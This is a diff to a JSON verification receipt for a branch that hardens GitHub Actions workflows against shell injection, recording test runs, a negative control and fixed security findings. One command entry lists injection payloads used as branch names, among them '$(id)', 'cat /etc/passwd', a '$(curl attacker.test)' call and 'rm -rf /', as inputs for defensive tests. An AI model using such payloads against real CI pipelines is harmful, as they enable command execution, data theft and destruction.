@@ -39,8 +39,29 @@
     ],
     "main_only_commits_preserved": "All 39. Verified mechanically: zero deletions in the diff origin/main..HEAD, and all 31 files that main changed since the merge base are byte-identical to main on this branch.",
     "landmarks_verified_present": {
-      "from_main": ["SECURITY.md", ".pre-commit-config.yaml", ".mcp.json", "openapi.yaml", ".github/workflows/gates.yml", ".github/workflows/gates-template-sync.yml", "skills/pack-sync/SKILL.md", "skills/agent-bus/SKILL.md"],
-      "from_tip": ["services/desk-gateway/", "contracts/tool-rosters/", "contracts/tool-packs/", "infra/desk-gateway/", "infra/railway/", "infra/tailscale/", "grokbot/", "skills/desk-bootstrap/", "prompts-assembled/", "ci/gates/check_desk_integrity.py", ".github/workflows/desk-intake.yml"]
+      "from_main": [
+        "SECURITY.md",
+        ".pre-commit-config.yaml",
+        ".mcp.json",
+        "openapi.yaml",
+        ".github/workflows/gates.yml",
+        ".github/workflows/gates-template-sync.yml",
+        "skills/pack-sync/SKILL.md",
+        "skills/agent-bus/SKILL.md"
+      ],
+      "from_tip": [
+        "services/desk-gateway/",
+        "contracts/tool-rosters/",
+        "contracts/tool-packs/",
+        "infra/desk-gateway/",
+        "infra/railway/",
+        "infra/tailscale/",
+        "grokbot/",
+        "skills/desk-bootstrap/",
+        "prompts-assembled/",
+        "ci/gates/check_desk_integrity.py",
+        ".github/workflows/desk-intake.yml"
+      ]
     }
   },
   "commands": [
@@ -53,8 +74,8 @@
     {
       "cmd": "python3 -m pytest ci/tests/ -q",
       "exit_code": 0,
-      "duration_s": 10.1,
-      "output_tail": "119 passed in 10.11s"
+      "duration_s": 9.6,
+      "output_tail": "133 passed in 9.60s"
     },
     {
       "cmd": "python3 ci/gates/check_secrets.py --base origin/main",
@@ -133,6 +154,30 @@
       "exit_code": 0,
       "duration_s": 0.1,
       "output_tail": "(no output; both workflow files parse as YAML after the hand resolution)"
+    },
+    {
+      "cmd": "python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -v",
+      "exit_code": 0,
+      "duration_s": 0.07,
+      "output_tail": "14 passed in 0.07s"
+    },
+    {
+      "cmd": "git show e0ad62ad:.github/workflows/gates.yml > .github/workflows/gates.yml && python3 -m pytest ci/tests/test_gates.py::TestWorkflowShellInjection -q",
+      "exit_code": 1,
+      "duration_s": 0.1,
+      "output_tail": "FAILED test_no_github_expression_inside_a_run_body[.github/workflows/gates.yml]\nFAILED test_acting_bot_pattern_is_anchored_at_both_ends[.github/workflows/gates.yml]\n2 failed, 12 passed in 0.10s"
+    },
+    {
+      "cmd": "bash -c '<the workflow's bot-resolution logic> ' with GITHUB_HEAD_REF set to each of: bot-01-$(id)/x, bot-01-`whoami`/x, 'bot-01-a;cat /etc/passwd/x', 'bot-01-a$(curl attacker.test)/x', 'bot-01-a\"; rm -rf /; #/x', bot-07-nope/x, claude/desk-v2-stack-q0ct4r",
+      "exit_code": 0,
+      "duration_s": 0.1,
+      "output_tail": "every payload REJECTED; bot-03-android/feat-push and bot-01-systems-backend/x still accepted"
+    },
+    {
+      "cmd": "python3 - <<'PY' (parse both gates.yml with yaml.safe_load, assert no step's run: body contains '${{')",
+      "exit_code": 0,
+      "duration_s": 0.1,
+      "output_tail": ".github/workflows/gates.yml: CLEAN — no ${{ }} in any run: body\nci/.github/workflows/gates.yml: CLEAN — no ${{ }} in any run: body"
     }
   ],
   "claims": [
@@ -197,6 +242,23 @@
     {
       "claim": "Both workflow files are valid YAML after the hand resolution — the add/add resolution did not leave a structurally broken workflow",
       "evidence_command_index": 14
+    },
+    {
+      "claim": "The two Greptile P1s are locked in by 14 new tests in ci/tests/test_gates.py (TestWorkflowShellInjection): no ${{ }} inside any run: body in either workflow, the acting-bot pattern anchored at both ends, seven injection payloads rejected, three real branches still resolving",
+      "evidence_command_index": 15
+    },
+    {
+      "claim": "Those tests have teeth — restoring the tip's vulnerable workflow makes exactly the two P1 assertions fail, with messages naming the offending step and the fix. A test that passes on correct code without failing on broken code would be worthless; this is the negative control",
+      "evidence_command_index": 16,
+      "expects_failure": true
+    },
+    {
+      "claim": "Behavioural confirmation independent of the tests: the workflow's own bot-resolution logic, run standalone, rejects command substitution, backticks, a semicolon chain and a quote-break in the branch name, while still resolving legitimate bot-prefixed branches",
+      "evidence_command_index": 17
+    },
+    {
+      "claim": "Structural confirmation that neither P1 survives on this branch: both workflow files parse and no step's run: body contains a GitHub expression",
+      "evidence_command_index": 18
     }
   ],
   "security_findings_carried_forward": [
@@ -208,7 +270,7 @@
       "verdict": "VALID against the tip. The tip's copy of the live workflow ran `--bot \"${{ steps.bot.outputs.bot }}\"` inside run:, and validated the bot id against an unanchored `^bot-0[0-6]-`, which accepts `bot-01-$(id)` and carries it into a later shell.",
       "disposition": "FIXED on this branch. The acting bot is now derived from the GITHUB_HEAD_REF / GITHUB_REF environment variables rather than a ${{ }} expansion, validated against `^bot-0[0-6]-[a-z0-9-]+$` (anchored at both ends), and passed to later steps through an env: block as \"$BOT\". No ${{ }} appears inside any run: body in either gates.yml.",
       "how": "The conflict resolution kept main's hardened body (#12-#15) and discarded the tip's older pre-hardening copy, adding only the tip's genuinely new G-7 step. Verified by grep: every ${{ }} in both .github/workflows/gates.yml and ci/.github/workflows/gates.yml sits in an env: block.",
-      "residual": null
+      "residual": "None open. Additionally now regression-tested: TestWorkflowShellInjection fails if an anchored pattern or the env: discipline is ever reverted, which is what went undetected the first time — the two workflow copies still agreed with each other, so the template-sync check passed while both were vulnerable."
     },
     {
       "id": "4140127775",
@@ -218,7 +280,7 @@
       "verdict": "VALID against the tip. The tip's copy ran `RECEIPT=$(ls -1 \".receipts/${{ steps.bot.outputs.bot }}\"/*.json | head -n1)` and then interpolated `${{ steps.receipt.outputs.path }}` into three further run: bodies.",
       "disposition": "FIXED on this branch. BOT, BASE_REF and RECEIPT all reach the shell through env: and are referenced as quoted variables. The receipt is additionally now selected from the diff (`git diff --name-only --diff-filter=d \"origin/$BASE_REF...HEAD\"`) rather than by globbing the directory, which also closes the stale-receipt fail-open main's #16 fixed.",
       "how": "Same resolution as above.",
-      "residual": null
+      "residual": "None open. Covered by the same regression tests."
     },
     {
       "id": null,
@@ -256,6 +318,7 @@
   "observations": [
     "PRs #17-#24 were squash-merged into intermediate stack branches rather than into main, which is how main came to lack services/desk-gateway, contracts/tool-rosters, grokbot/, infra/desk-gateway and skills/desk-bootstrap while all eight PRs read as merged. Worth a note in the stack procedure: a squash-merge into a branch that never reaches main leaves the PR green and the repository unchanged.",
     "The tip carried an older copy of .github/workflows/gates.yml than main did, so a naive 'prefer the tip' resolution would have silently reverted the #12-#15 shell-injection hardening on the live workflow. main's gates-template-sync.yml is what makes that recoverable: because the live body must equal the template body, the correct resolution is mechanical rather than a judgement call.",
-    "G-4's surface-coverage rule from #16 will do this to every change document written before it. Any other stack branch still waiting to land should expect the same failure and the same one-line fix."
+    "G-4's surface-coverage rule from #16 will do this to every change document written before it. Any other stack branch still waiting to land should expect the same failure and the same one-line fix.",
+    "The template-sync check cannot catch this class on its own: it compares the two copies to each other, so it passes when both are equally vulnerable. That is exactly what happened — the tip carried an older copy of both files forward and sync stayed green. TestWorkflowShellInjection checks each file against the property rather than against its twin, which is the gap that let the regression through."
   ]
 }
